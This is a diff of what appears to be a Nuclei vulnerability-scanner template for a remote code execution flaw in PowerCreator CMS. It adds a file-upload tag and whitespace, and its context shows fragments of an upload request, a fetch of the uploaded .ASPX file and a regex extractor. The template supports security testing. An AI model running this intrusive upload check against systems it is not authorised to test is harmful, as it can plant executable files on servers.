@@ -1,4 +1,5 @@
 id: powercreator-cms-rce
+
 info:
   name: PowerCreator CMS - Remote Code Execution
   author: pikpikcu
@@ -11,7 +12,8 @@ info:
     cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
     cvss-score: 10.0
     cwe-id: CWE-77
-  tags: rce,powercreator,intrusive
+  tags: rce,powercreator,intrusive,fileupload
+
 requests:
   - raw:
       - |
@@ -26,9 +28,11 @@ requests:
 
         {{randstr}}
         -----------------------------20873900192357278038549710136--
+
       - |
         GET /ResourcePic/{{endpoint}} HTTP/1.1
         Host: {{Hostname}}
+
     extractors:
       - type: regex
         name: endpoint
@@ -36,6 +40,7 @@ requests:
         part: body
         regex:
           - "(.*?.ASPX)"
+
     req-condition: true
     matchers:
       - type: dsl
